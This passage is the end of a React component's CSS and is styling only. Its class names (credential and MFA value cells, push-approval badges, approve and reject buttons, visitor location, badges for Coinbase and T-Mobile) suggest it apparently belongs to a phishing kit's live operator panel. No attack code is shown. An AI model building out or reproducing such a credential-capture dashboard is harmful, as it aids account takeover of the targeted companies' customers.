          border-radius: 20px;
          font-size: 12px;
          color: #a78bfa;
          font-weight: 500;
        }

        .toggle-label {
          display: flex;
          align-items: center;
          gap: 12px;
          cursor: pointer;
        }

        .toggle-text {
          font-size: 13px;
          color: #94a3b8;
          font-weight: 500;
        }

        .toggle-switch {
          position: relative;
          width: 48px;
          height: 26px;
        }

        .toggle-switch input {
          opacity: 0;
          width: 0;
          height: 0;
        }

        .toggle-slider {
          position: absolute;
          cursor: pointer;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(100, 116, 139, 0.3);
          border-radius: 26px;
          transition: all 0.3s ease;
        }

        .toggle-slider:before {
          position: absolute;
          content: "";
          height: 20px;
          width: 20px;
          left: 3px;
          bottom: 3px;
          background: #64748b;
          border-radius: 50%;
          transition: all 0.3s ease;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }

        .toggle-switch input:checked + .toggle-slider {
          background: linear-gradient(135deg, rgba(139, 92, 246, 0.4) 0%, rgba(99, 102, 241, 0.4) 100%);
        }

        .toggle-switch input:checked + .toggle-slider:before {
          transform: translateX(22px);
          background: linear-gradient(135deg, #a78bfa 0%, #818cf8 100%);
        }

        .empty-state {
          padding: 80px 20px;
          text-align: center;
        }

        .empty-icon {
          font-size: 64px;
          margin-bottom: 20px;
          opacity: 0.5;
        }

        .empty-state h3 {
          font-size: 20px;
          color: #e2e8f0;
          margin: 0 0 8px;
          font-weight: 600;
        }

        .empty-state p {
          color: #64748b;
          margin: 0;
          font-size: 14px;
        }

        .table-wrapper {
          overflow-x: auto;
        }

        .table {
          width: 100%;
          border-collapse: collapse;
        }

        .table th {
          text-align: left;
          padding: 16px 20px;
          font-size: 11px;
          font-weight: 600;
          color: #64748b;
          text-transform: uppercase;
          letter-spacing: 1px;
          border-bottom: 1px solid rgba(139, 92, 246, 0.1);
          background: rgba(15, 15, 26, 0.4);
        }

        .table td {
          padding: 18px 20px;
          border-bottom: 1px solid rgba(139, 92, 246, 0.05);
          vertical-align: middle;
        }

        .table tr:last-child td {
          border-bottom: none;
        }

        .table tr.inactive {
          opacity: 0.4;
        }

        .table tr:hover {
          background: rgba(139, 92, 246, 0.05);
        }

        .status-indicator {
          display: block;
          width: 10px;
          height: 10px;
          border-radius: 50%;
        }

        .status-indicator.online {
          background: #4ade80;
          box-shadow: 0 0 12px rgba(74, 222, 128, 0.6);
          animation: glow 2s ease-in-out infinite;
        }

        @keyframes glow {
          0%, 100% { box-shadow: 0 0 12px rgba(74, 222, 128, 0.6); }
          50% { box-shadow: 0 0 20px rgba(74, 222, 128, 0.8); }
        }

        .status-indicator.offline {
          background: #475569;
        }

        .visitor-cell {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .visitor-device {
          font-size: 24px;
        }

        .visitor-browser {
          font-size: 14px;
          color: #e2e8f0;
          font-weight: 500;
        }

        .visitor-os {
          font-size: 12px;
          color: #64748b;
        }

        .credentials-cell {
          min-width: 200px;
        }

        .cred-row {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 6px;
        }

        .cred-row:last-child {
          margin-bottom: 0;
        }

        .cred-label {
          font-size: 10px;
          color: #64748b;
          font-weight: 600;
          background: rgba(100, 116, 139, 0.2);
          padding: 2px 6px;
          border-radius: 4px;
          min-width: 24px;
          text-align: center;
        }

        .cred-value {
          font-size: 13px;
          font-family: 'JetBrains Mono', ui-monospace, monospace;
          background: rgba(34, 197, 94, 0.15);
          color: #4ade80;
          padding: 4px 10px;
          border-radius: 6px;
          border: 1px solid rgba(34, 197, 94, 0.2);
        }

        .cred-value.mfa {
          background: rgba(245, 158, 11, 0.15);
          color: #fbbf24;
          border-color: rgba(245, 158, 11, 0.2);
        }

        .no-creds {
          font-size: 13px;
          color: #475569;
          font-style: italic;
        }

        .location-cell {
          display: flex;
          align-items: center;
          gap: 12px;
        }

        .location-flag {
          font-size: 24px;
        }

        .location-primary {
          font-size: 14px;
          color: #e2e8f0;
          font-weight: 500;
        }

        .location-secondary {
          font-size: 12px;
          color: #64748b;
          font-family: 'JetBrains Mono', ui-monospace, monospace;
        }

        .status-cell {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          align-items: center;
        }

        .badge {
          padding: 5px 10px;
          border-radius: 6px;
          font-size: 11px;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }

        .badge-wcg { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
        .badge-coinbase { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
        .badge-arise { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
        .badge-tmobile { background: rgba(236, 72, 153, 0.2); color: #f472b6; border: 1px solid rgba(236, 72, 153, 0.3); }
        .badge-reyes { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
        .badge-warning { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }
        .badge-info { background: rgba(139, 92, 246, 0.2); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); }

        .page-indicator {
          font-size: 12px;
          color: #64748b;
        }

        .badge-push {
          background: linear-gradient(135deg, rgba(245, 158, 11, 0.2) 0%, rgba(234, 88, 12, 0.2) 100%);
          color: #fbbf24;
          border: 1px solid rgba(245, 158, 11, 0.4);
          animation: pulse-push 1.5s ease-in-out infinite;
        }

        @keyframes pulse-push {
          0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
          50% { box-shadow: 0 0 0 8px rgba(245, 158, 11, 0); }
        }

        .time-cell {
          text-align: right;
        }

        .time-primary {
          font-size: 13px;
          color: #e2e8f0;
          font-family: 'JetBrains Mono', ui-monospace, monospace;
        }

        .time-secondary {
          font-size: 11px;
          color: #64748b;
        }

        /* ── Action buttons ── */
        .actions-cell {
          display: flex;
          gap: 8px;
          align-items: center;
        }

        .btn-action {
          padding: 8px 14px;
          border-radius: 8px;
          font-size: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          border: 1px solid transparent;
          display: inline-flex;
          align-items: center;
          gap: 6px;
        }

        .btn-approve {
          background: rgba(34, 197, 94, 0.15);
          border-color: rgba(34, 197, 94, 0.3);
          color: #4ade80;
        }

        .btn-approve:hover {
          background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
          border-color: transparent;
          color: #fff;
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(34, 197, 94, 0.4);
        }

        .btn-reject {
          background: rgba(239, 68, 68, 0.15);
          border-color: rgba(239, 68, 68, 0.3);
          color: #f87171;
        }

        .btn-reject:hover {
          background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
          border-color: transparent;
          color: #fff;
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4);
        }

        .action-status {
          font-size: 12px;
          font-weight: 600;
          padding: 6px 12px;
          border-radius: 6px;
        }

        .action-status.approved {
          background: rgba(34, 197, 94, 0.15);
          color: #4ade80;
        }

        .action-status.rejected {
          background: rgba(239, 68, 68, 0.15);
          color: #f87171;
        }

        .action-status.none {
          color: #475569;
        }

        /* ── Phone editor ── */
        .phone-editor {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-top: 8px;
          flex-wrap: wrap;
        }

        .phone-select, .phone-input {
          padding: 8px 12px;
          border-radius: 8px;
          border: 1px solid rgba(139, 92, 246, 0.3);
          background: rgba(15, 15, 26, 0.8);
          color: #e2e8f0;
          font-size: 13px;
          font-family: inherit;
          transition: all 0.2s ease;
        }

        .phone-select:focus, .phone-input:focus {
          outline: none;
          border-color: rgba(139, 92, 246, 0.6);
          box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15);
        }

        .phone-select {
          cursor: pointer;
          background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a78bfa' stroke-width='2'%3E%3Cpolyline points='6,9 12,15 18,9'/%3E%3C/svg%3E");
          background-repeat: no-repeat;
          background-position: right 10px center;
          padding-right: 32px;
          appearance: none;
          -webkit-appearance: none;
        }

        .phone-select option {
          background: #1a1a2e;
          color: #e2e8f0;
        }

        .phone-input {
          min-width: 160px;
        }

        .phone-input::placeholder {
          color: #64748b;
        }

        .btn-phone {
          padding: 8px 14px;
          border-radius: 8px;
          font-size: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          border: 1px solid transparent;
          display: inline-flex;
          align-items: center;
          gap: 6px;
        }

        .btn-phone-primary {
          background: rgba(139, 92, 246, 0.15);
          border-color: rgba(139, 92, 246, 0.3);
          color: #a78bfa;
        }

        .btn-phone-primary:hover {
          background: linear-gradient(135deg, #a78bfa 0%, #818cf8 100%);
          border-color: transparent;
          color: #fff;
          transform: translateY(-2px);
          box-shadow: 0 4px 20px rgba(139, 92, 246, 0.4);
        }

        .btn-phone-secondary {
          background: rgba(100, 116, 139, 0.15);
          border-color: rgba(100, 116, 139, 0.3);
          color: #94a3b8;
        }

        .btn-phone-secondary:hover {
          background: rgba(100, 116, 139, 0.25);
          border-color: rgba(100, 116, 139, 0.5);
          color: #e2e8f0;
        }

        /* ── Responsive ── */
        @media (max-width: 1400px) {
          .stats-grid {
            grid-template-columns: repeat(2, 1fr);
          }
        }

        @media (max-width: 1000px) {
          .sidebar {
            display: none;
          }
          .main {
            margin-left: 0;
          }
        }

        @media (max-width: 768px) {
          .stats-grid {
            grid-template-columns: 1fr;
          }
          .header {
            flex-direction: column;
            gap: 20px;
          }
          .header-right {
            width: 100%;
            flex-wrap: wrap;
          }
          .pause-banner-inner {
            flex-wrap: wrap;
          }
        }
      `}</style>
    </div>
  );
}
